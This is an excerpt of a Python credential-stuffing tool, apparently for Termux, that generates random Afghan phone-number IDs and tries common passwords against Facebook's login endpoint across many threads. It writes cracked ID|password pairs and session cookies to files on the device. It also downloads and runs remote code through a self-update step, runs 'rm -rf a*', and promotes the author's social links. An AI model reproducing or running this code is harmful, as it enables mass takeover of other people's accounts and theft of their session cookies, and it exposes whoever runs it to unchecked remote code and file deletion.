...
os.system('xdg-open http://wa.me/+93782832281')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100075227348133')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
try:
	prox= requests.get('https://github.com/AryanHack907/New-JKing/blob/main/Joya.txt').text
	open('.Joya.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
prox=open('.Joya.txt','r').read().splitlines()
...
logo =("""  
\x1b[1;95m====================================================
\033[1;31m\033[1;37m \033[1;96m$$\   $$\ $$\   $$\ $$$$$$\ $$\   $$\  $$$$$$\ \033[1;31m   ❘
\033[1;31m\033[1;37m \033[1;92m$$$\  $$ |$$ | $$  |\_$$  _|$$$\  $$ |$$  __$$\ \033[1;31m  ❘
\033[1;31m\033[1;37m \033[1;93m$$$$\ $$ |$$ |$$  /   $$ |  $$$$\ $$ |$$ /  \__| \033[1;31m ❘
\033[1;31m\033[1;37m \033[1;91m$$ $$\$$ |$$$$$  /    $$ |  $$ $$\$$ |$$ |$$$$\ \033[1;31m  ❘
\033[1;31m\033[1;37m \033[1;92m$$ \$$$$ |$$  $$<     $$ |  $$ \$$$$ |$$ |\_$$ |\033[1;31m  ❘
\033[1;31m\033[1;37m \033[1;93m$$ |\$$$ |$$ |\$$\    $$ |  $$ |\$$$ |$$ |  $$ |\033[1;31m  ❘
\033[1;31m\033[1;37m \033[1;93m$$ | \$$ |$$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |\033[1;31m  ❘
\033[1;31m\033[1;37m \033[1;33m\__|  \__|\__|  \__|\______|\__|  \__| \______/\033[1;31m   ❘   
\x1b[1;95m====================================================
\033[1;96m⟪𒋨⟫══╣\033[1;96mAUTHER     ┇   {RAYEES JANAN
\033[1;96m⟪𒋨⟫══╣\033[1;96mFACEBOOK   ┇   {RAYEES JANAN}
\033[1;96m⟪𒋨⟫══╣\033[1;96mGITHUB     ┇   {Kng JANAN 404}
\033[1;96m⟪𒋨⟫══╣\033[1;96mYOUTUBE    ┇   {CYBER HACK 420}
\033[1;96m⟪𒋨⟫══╣\033[1;96mWHATSAPP   ┇   {+93782832281}
\033[1;96m⟪𒋨⟫══╣\033[1;96mNETWORK    ┇   {3G, 4G/5G, LTE}
\033[1;96m⟪𒋨⟫══╣\033[1;96mTOOLS      ┇      {FREE}
\033[1;96m⟪𒋨⟫══╣\033[1;96mVERSION    ┇      {0.2}
====================================================\033[1;37m""")
def lines():
	print('\33[1;37m----------------------------------------------')
...
try:
    ...
    proxy = requests.get('https://github.com/KngJANAN404/Free').text.splitlines()
    v = 1.9
    update = requests.get('https://github.com/KngJANAN404/New-JKing/blob/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://github.com/KngJANAN404/Free > JRun.py')
        os.system('python JRun.py')
    else:pass
...
def JOYA():
	os.system('clear')
	print(logo)
	print('\033[1;93m[1] Random➤AFGHANISTAN➤CLONING')
	print('\033[1;96m[3] Follow Me On Facebook')
	print('\x1b[1;91m[5] Exit Main Menu')
	print('\33[1;37m----------------------------------------------')
	JOYA1 = input('\033[1;96m[•] Select option  : ')
	if JOYA1 =='1':
		annu()
	if JOYA1 =='5':
		JOYA()
	if JOYA1 =='4':
		os.system('xdg-open http://wa.me/+93782832281?text=RAYEES.JANAN💜😍Sir😐❤')
	if JOYA1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=vhvbfkj');JANAN()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('\033[1;93m[1] RANDOM OLD IDZ UPDATE  Method \x1b[1;92m1')
    print('\x1b[1;91m[4] Go To Main Menu')
    lines()
    JOYA1 = input('\033[1;93m[+] CHOOSE OptION : ')
    if JOYA1 =='1':
    	m1()
    else:
...
def bangla():
	...
	lines()
	JOYA1 = input('\033[1;37m[+] Select option : ')
	if JOYA1 =='1':
		b1()
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;96m[+] Example  : 9370,9379,9378,****Etc')
    print('\033[1;93m+] See Note : Use Your Sim Code ')
    lines()
    kode = input('\033[1;93m[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('\033[1;93m[+] Example  : 1000,5000,100000,****Etc')
    print('\033[1;93m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('\033[1;93m[+] Idz Lemit : '))
    print(46*'-')
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'afghan123','afghanistan','۱۲۳۴۵۶','kabul123','100200']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');JOYA()
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
            log_data = {
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[K-JANAN →😐❤ OK] '+cid+'|'+ps+'\033[0;97m')
                print(f'    \033[38;5;46m[COOKIE🧿] \033[38;5;192m'+coki)        
                open('/sdcard/K-JANAN-Ok.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[K-JANAN →❤😂CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('/sdcard/K-JANAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJANAN➥CRACK\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/MRCYBER420/khan407/trick/blob/main/trick.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		os.system('am start https://wa.me/+93782832281?text=' + tks)
		Subscraption()        
Subscraption()
